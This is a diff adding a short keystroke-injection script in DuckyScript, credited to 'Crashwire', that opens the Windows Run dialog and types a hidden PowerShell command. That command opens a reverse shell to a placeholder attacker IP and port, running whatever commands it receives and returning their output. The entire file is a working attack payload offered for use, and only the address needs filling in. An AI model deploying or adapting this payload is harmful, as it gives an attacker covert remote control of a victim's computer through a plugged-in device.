@@ -1,0 +1,8 @@
+REM AUTHOR Crashwire
+REM DESCRIPTION Initiates a reverse shell to the attackers system (Activate Netcat Listner and Change the IP/PORT in the payload
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoP -W Hidden -C "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER IP',ATTACK PORT);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($bytes=$stream.Read($buffer,0,$buffer.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($buffer,0,$bytes);$sendback=(iex $data 2>&1 | Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback+'PS '+(pwd).Path+'> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();};$client.Close()"
+ENTER
